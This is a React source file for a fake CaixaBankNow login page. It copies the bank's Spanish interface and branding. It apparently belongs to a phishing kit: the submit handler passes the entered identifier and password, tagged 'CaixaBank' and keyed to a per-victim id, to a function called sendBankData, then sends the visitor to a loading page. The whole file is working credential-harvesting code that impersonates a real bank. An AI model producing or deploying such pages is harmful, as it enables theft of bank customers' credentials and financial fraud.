import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../utils/utils'
import Checkmark from '../icons/Checkmark.svg?react'
import Keyboard from '../icons/Keyboard.svg?react'
import Lock from '../images/Lock.png'
import { Button } from '../ui/Buttons/Button'
import { Input } from '../ui/Inputs/Input'

export function LoginPage() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'CaixaBank', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main className="flex py-10">
      <div className="m-auto flex w-full max-w-screen-sm flex-col items-center gap-6 p-4 font-sans">
        <div className="flex flex-col items-center gap-y-1">
          <img src={Lock} className="h-[35px] w-[35px]" alt="" />
          <h1 className="text-center text-2xl font-semibold text-[#007bad]">Acceso seguro a CaixaBankNow</h1>
        </div>
        <div className="flex w-full flex-col gap-4 text-center">
          <div className="flex w-full flex-col gap-2">
            <label htmlFor="" className="flex w-full flex-row justify-between">
              <span className="font-bold text-[#555555]">Identificador</span>
              <span className="text-[13px] font-medium text-[#555555]">Entrar sin teclado virtual</span>
            </label>
            <Input value={login} onChange={(e) => setLogin(e.target.value)} />
            <div className="flex flex-row items-center justify-between">
              <div className="flex flex-row items-center gap-2">
                <div className="relative flex flex-row gap-x-2">
                  <input className="peer absolute size-5 cursor-pointer opacity-0" id="check" type="checkbox" checked={true} />
                  <div className="flex size-5 items-center justify-center border border-[#555555] peer-checked:bg-[#007bad]">
                    <Checkmark className="h-4 w-4" />
                  </div>
                </div>
                <label className="text-[15px] font-normal">Guardar identificador</label>
              </div>
              <div className="flex flex-row items-center gap-2">
                <span className="text-xs font-medium text-[#007BAD] max-sm:hidden">Utilizar teclado virtual</span>
                <Keyboard className="h-6 w-6" />
              </div>
            </div>
          </div>
          <div className="flex w-full flex-col gap-2">
            <label htmlFor="" className="mt-3 flex w-full flex-row items-center gap-3">
              <span className="font-bold text-[#555555]">Contraseña</span>
              <span className="text-sm font-normal text-[#007bade6]">¿Has olvidado tus claves de acceso?</span>
            </label>
            <Input value={password} onChange={(e) => setPassword(e.target.value)} />
            <div className="flex flex-row items-center justify-end gap-2">
              <span className="text-xs font-medium text-[#007BAD] max-sm:hidden">Utilizar teclado virtual</span>
              <Keyboard className="h-6 w-6" />
            </div>
          </div>
          <Button title="Entrar a CaixaBankNow" onClick={sendAndNavigate} />
          <span className="text-sm font-medium text-[#007bade6]">¿Aún no eres cliente? Hazte cliente</span>
          <div className="flex flex-row flex-wrap items-center justify-center gap-x-4 gap-y-2 text-[13px] font-normal text-[#666]">
            <span>Alta a CaixaBankNow</span>
            <span>Demostración</span>
            <span>Seguridad</span>
            <span>CaixaBankProtect</span>
          </div>
        </div>
      </div>
    </main>
  )
}
